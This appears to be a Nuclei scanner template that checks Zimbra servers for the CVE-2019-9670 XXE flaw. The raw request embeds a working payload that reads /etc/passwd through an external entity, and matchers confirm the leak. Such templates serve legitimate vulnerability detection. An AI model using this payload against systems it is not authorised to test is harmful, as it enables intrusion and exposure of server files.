id: cve-2019-9670

info:
  name: Zimbra XXE
  author: glatisant
  severity: high

requests:
  - raw:
      - |
          POST /Autodiscover/Autodiscover.xml HTTP/1.1
          Host: {{Hostname}}
          Accept: */*
          Accept-Language: en
          User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
          Connection: close
          Content-Type: text/xml

          <!DOCTYPE xxe [<!ELEMENT name ANY ><!ENTITY xxe SYSTEM "file:./../../../../../etc/passwd" >]><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"><Request><EMailAddress>test@test.com</EMailAddress><AcceptableResponseSchema>&xxe;</AcceptableResponseSchema></Request></Autodiscover>
    redirects: false
    matchers:
      - type: word
        words:
          - 'zmmailboxd.out'
          - 'Requested response schema not available'
          - 'root:'
          - '/bin/bash'

